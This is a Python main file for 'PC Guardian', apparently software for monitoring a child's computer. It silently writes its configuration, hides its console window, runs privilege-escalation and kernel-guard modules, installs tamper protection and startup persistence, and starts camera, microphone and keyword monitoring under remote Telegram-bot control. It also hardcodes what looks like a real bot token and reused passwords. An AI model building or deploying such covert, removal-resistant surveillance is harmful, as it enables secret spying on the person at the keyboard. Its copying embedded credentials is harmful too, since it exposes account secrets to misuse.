"""
PC Guardian — Main Entry Point
Single click. No errors. Everything automatic.
"""

import sys
import os
import ctypes
import threading
import tempfile
import shutil
import atexit

# ── Fix temp directory warning ────────────────────────────────────────────────
# PyInstaller extracts to _MEIXXXXXX — clean it up properly on exit
_mei_dir = getattr(sys, "_MEIPASS", None)

def _cleanup_mei():
    if _mei_dir and os.path.exists(_mei_dir):
        try:
            shutil.rmtree(_mei_dir, ignore_errors=True)
        except Exception:
            pass

atexit.register(_cleanup_mei)

# ── Path setup ────────────────────────────────────────────────────────────────
if getattr(sys, "frozen", False):
    # Running as exe — use folder next to exe for config/logs
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

sys.path.insert(0, BASE_DIR)

CONFIG_DIR   = os.path.join(BASE_DIR, "config")
CONFIG_PATH  = os.path.join(CONFIG_DIR, "config.enc")
SETUP_FLAG   = os.path.join(BASE_DIR, ".setup_done")
INSTALL_FLAG = os.path.join(BASE_DIR, ".installed")
LOG_DIR      = os.path.join(BASE_DIR, "logs")

# Create required directories immediately
os.makedirs(CONFIG_DIR, exist_ok=True)
os.makedirs(LOG_DIR,    exist_ok=True)


def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def needs_setup() -> bool:
    return not os.path.exists(CONFIG_PATH) or not os.path.exists(SETUP_FLAG)


def auto_setup():
    """
    Auto-create config from hardcoded credentials in first_run.py.
    No user interaction needed — single click.
    """
    try:
        from first_run import run_first_setup
        run_first_setup()
    except Exception as e:
        # Absolute fallback — write config directly
        try:
            from config.crypto import encrypt_config
            encrypt_config({
                "bot_token":          "8901039134:AAEBI8Wn-HKC1b3IG9qzz4hIwKnKv_UyIcA",
                "allowed_user_id":    8889476230,
                "uninstall_password": "decdrv",
                "lock_keyword":       "lockson",
                "child_name":         "Son",
                "lock_message":       "Take a breath Son. Dad is watching.",
                "daily_report_time":  "21:00",
                "school_schedule":    {"enabled": False, "lock_time": "08:00", "unlock_time": "15:00"},
                "bedtime_schedule":   {"enabled": False, "lock_time": "21:00", "unlock_time": "16:00"},
                "panic_detection":    {"voice_enabled": True, "behavior_enabled": True, "volume_threshold": 0.7},
                "web_dashboard":      {"enabled": True, "port": 8080, "password": "decdrv"},
                "camera_enabled":     True,
                "mic_enabled":        True,
                "speaker_enabled":    True,
                "anthropic_api_key":  "",
            })
            with open(SETUP_FLAG, "w") as f:
                f.write("1")
        except Exception as e2:
            # Write error log
            with open(os.path.join(LOG_DIR, "startup_error.txt"), "w") as f:
                f.write(f"Config error: {e}\nFallback error: {e2}\n")


def start_guardian():
    # Fix sys.path for frozen exe
    if getattr(sys, "frozen", False):
        meipass = getattr(sys, "_MEIPASS", BASE_DIR)
        if meipass not in sys.path:
            sys.path.insert(0, meipass)

    from config.config import Config
    from logs.logger import setup_logger
    from core.lock_engine import LockEngine
    from core.keyword_listener import KeywordListener
    from monitor.activity import ActivityMonitor
    from monitor.behavior import BehaviorMonitor
    from monitor.reporter import Reporter
    from scheduler.schedule_engine import ScheduleEngine
    from av.camera import CameraSystem
    from av.microphone import MicrophoneSystem
    from av.speaker import SpeakerSystem
    from bot.bot import GuardianBot
    from protection.tamper_detect import TamperDetect

    logger = setup_logger("main")

    # ── Privileges ────────────────────────────────────────────────────────────
    try:
        from privilege import full_privilege_setup
        full_privilege_setup()
    except Exception as e:
        logger.warning(f"Privilege: {e}")

    # ── Kernel guard ──────────────────────────────────────────────────────────
    try:
        from kernel_guard import setup_kernel_guard, disable_kernel_guard
        setup_kernel_guard()
        atexit.register(disable_kernel_guard)
    except Exception as e:
        logger.warning(f"Kernel guard: {e}")

    # ── Install protection once ───────────────────────────────────────────────
    if not os.path.exists(INSTALL_FLAG):
        try:
            from protection import full_install
            full_install()
        except Exception as e:
            logger.warning(f"Protection: {e}")
        try:
            from core.startup import install_all
            install_all()
        except Exception as e:
            logger.warning(f"Startup: {e}")
        try:
            with open(INSTALL_FLAG, "w") as f:
                f.write("1")
        except Exception:
            pass

    # ── Load systems ──────────────────────────────────────────────────────────
    cfg         = Config.load()
    lock_engine = LockEngine(cfg)
    speaker     = SpeakerSystem(cfg)
    camera      = CameraSystem(cfg)
    mic         = MicrophoneSystem(cfg, lock_engine)
    activity    = ActivityMonitor(cfg)
    behavior    = BehaviorMonitor(cfg, lock_engine, mic)
    reporter    = Reporter(cfg, activity)
    scheduler   = ScheduleEngine(cfg, lock_engine)
    tamper      = TamperDetect(cfg)

    # ── MCP server ────────────────────────────────────────────────────────────
    try:
        import mcp_server
        mcp_server.init(cfg, lock_engine, camera, mic, speaker, activity)
        mcp_server.start_mcp_thread()
    except Exception as e:
        logger.warning(f"MCP: {e}")

    # ── Bot ───────────────────────────────────────────────────────────────────
    bot = GuardianBot(
        cfg=cfg, lock_engine=lock_engine, camera=camera,
        mic=mic, speaker=speaker, activity=activity, scheduler=scheduler,
    )

    threads = [
        threading.Thread(target=activity.start,  daemon=True, name="Activity"),
        threading.Thread(target=behavior.start,  daemon=True, name="Behavior"),
        threading.Thread(target=scheduler.start, daemon=True, name="Scheduler"),
        threading.Thread(target=reporter.start,  daemon=True, name="Reporter"),
        threading.Thread(target=tamper.start,    daemon=True, name="Tamper"),
        threading.Thread(
            target=KeywordListener(cfg, lock_engine).start,
            daemon=True, name="Keyword"
        ),
    ]
    for t in threads:
        t.start()

    logger.info("PC Guardian fully operational.")
    bot.run()


if __name__ == "__main__":
    if "--change" in sys.argv:
        from first_run import change_credentials
        change_credentials()
        sys.exit(0)

    if "--uninstall" in sys.argv:
        pw = sys.argv[2] if len(sys.argv) > 2 else ""
        try:
            from driver_loader import uninstall_driver
            uninstall_driver(pw)
        except Exception:
            pass
        from protection import remove_protection
        ok, msg = remove_protection(pw)
        print(msg)
        sys.exit(0 if ok else 1)

    # Auto setup if needed — no user input, no popups
    if needs_setup():
        auto_setup()

    # Hide console window
    hide_console()

    # Start
    start_guardian()
